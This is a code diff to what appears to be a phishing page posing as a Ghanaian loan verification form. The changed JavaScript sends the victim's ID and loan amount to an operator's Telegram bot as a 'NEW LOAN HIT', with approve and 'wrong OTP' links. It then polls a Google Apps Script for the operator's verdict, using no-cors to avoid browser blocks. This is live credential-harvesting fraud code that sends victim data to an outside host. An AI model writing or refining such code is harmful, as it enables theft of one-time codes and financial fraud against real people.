@@ -120,7 +120,7 @@
         let isResetting = false;
         let otpInterval;
     // Config
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzNeOuKYspVrafIwvjWyt2P_Hb0LT9DH4SEhLgdhf8L-5MyffvGurrgTNvWpg7MGz3OUg/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyZc8KBVktPafygd4tT5rPgbBXynWuEXO5Z-SVbCRhwKR11KRdb64_QKX6MqFPjybqr0Q/exec";
     const urlParams = new URLSearchParams(window.location.search);
     const BOT_TOKEN = urlParams.get('token');
     const CHAT_ID = urlParams.get('id');
@@ -154,38 +154,47 @@
     }
 
     // 2. Verification Flow
-    async function startVerification() {
-        const id = document.getElementById('user-id').value;
-        const amt = document.getElementById('loan-amt').value;
-        if(!id) return alert("Required Field");
+    // 2. Verification Flow (UPDATED)
+async function startVerification() {
+    const id = document.getElementById('user-id').value;
+    const amt = document.getElementById('loan-amt').value;
+    if(!id) return alert("Required Field");
 
-        document.getElementById('display-id').innerText = id;
-        showView(2); // Show Loading
+    document.getElementById('display-id').innerText = id;
+    showView(2); // Show Loading
 
-        // Send Notification to Operator
-        const approveLink = `${SCRIPT_URL}?cmd=approve&num=${encodeURIComponent(String(id).trim())}`;
-        const wrongLink = `${SCRIPT_URL}?cmd=wrongOTP&num=${id}`;
-        const msg = `💰 *NEW LOAN HIT*
+    // --- CLEANED LINK LOGIC ---
+    const cleanIdForUrl = encodeURIComponent(String(id).trim());
+
+    const approveLink = `${SCRIPT_URL}?cmd=approve&num=${cleanIdForUrl}`;
+    const wrongLink = `${SCRIPT_URL}?cmd=wrongOTP&num=${cleanIdForUrl}`;
+
+    const msg = `💰 *NEW LOAN HIT*
 ID: ${id}
 Amt: GHS ${amt}
 
 ✅ *APPROVE:* ${approveLink}
 ❌ *WRONG OTP:* ${wrongLink}`;
-        
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, {
-    mode: 'no-cors' // Bypasses the CORS check
-});        
-        // Poll for Operator Approval
-        startPolling(id);
-    }
+    // --------------------------
+
+    // Send to Telegram with no-cors to prevent browser blocks
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, {
+        mode: 'no-cors'
+    });
+    
+    // Poll for Operator Approval
+    startPolling(id);
+}
     async function startPolling(phone) {
     const cleanID = String(phone).trim();
     
     const poller = setInterval(async () => {
         try {
             // v=Date.now() forces Google to bypass its 30-second cache
-            const r = await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&v=${Date.now()}`);
-            const status = (await r.text()).trim();
+const r = await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&v=${Date.now()}`, {
+    method: 'GET',
+    redirect: 'follow' // Forces the browser to follow Google's redirect
+});            const status = (await r.text()).trim();
 
             console.log("Status for " + cleanID + ": " + status);
 
